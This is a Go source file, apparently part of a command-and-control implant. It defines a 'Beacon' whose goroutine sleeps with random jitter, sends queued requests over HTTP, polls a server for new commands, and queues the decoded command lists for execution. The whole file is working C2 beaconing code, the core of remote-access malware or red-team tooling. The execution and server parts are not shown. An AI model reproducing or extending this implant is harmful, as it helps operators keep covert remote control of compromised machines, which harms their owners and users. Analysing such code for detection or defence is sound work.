package internal

import (
	"encoding/json"
	"io"
	"math/rand"
	"time"
)

type Beacon struct {
	Sleep    int
	Jitter   int
	HttpConn *HttpConn
	ReqQueue *SafeRequestQueue
	CmdQueue *SafeCommandQueue
}

func NewBeacon() *Beacon {
	return &Beacon{}
}

// Beacon.Start
//
// Init beacon goroutine
func (b *Beacon) Start() {
	// Init new RNG source
	rand.NewSource(time.Now().Unix())

	// Begin beacon routine
	go func() {
		for {
			// Calculate sleep time
			time.Sleep((time.Duration(b.Sleep) + time.Duration(rand.Intn(b.Jitter))) * time.Second)

			// Check for next request, ensure it's not nil
			if nextReq := b.ReqQueue.GetNext(); nextReq != nil {
				// Send request
				b.HttpConn.SendRequest(nextReq)
				// Shift queue up
				b.ReqQueue.ShiftUp()
				newCmdReq, err := b.HttpConn.NewCmdRequest()
				if err != nil {
					continue
				}

				resp, err := b.HttpConn.SendRequest(newCmdReq)
				if err != nil {
					continue
				}

				body, err := io.ReadAll(resp.Body)
				if err != nil {
					continue
				}

				// TODO: Decrypt
				var cmd []string
				err = json.Unmarshal(body, &cmd)
				if err != nil {
					continue
				}
				b.CmdQueue.Add(&cmd)
				continue
			} else {
				newCmdReq, err := b.HttpConn.NewCmdRequest()
				if err != nil {
					continue
				}

				resp, err := b.HttpConn.SendRequest(newCmdReq)
				if err != nil {
					continue
				}

				body, err := io.ReadAll(resp.Body)
				if err != nil {
					continue
				}

				// TODO: Decrypt
				var cmd []string
				err = json.Unmarshal(body, &cmd)
				if err != nil {
					continue
				}
				b.CmdQueue.Add(&cmd)
				continue
			}
		}
	}()
}
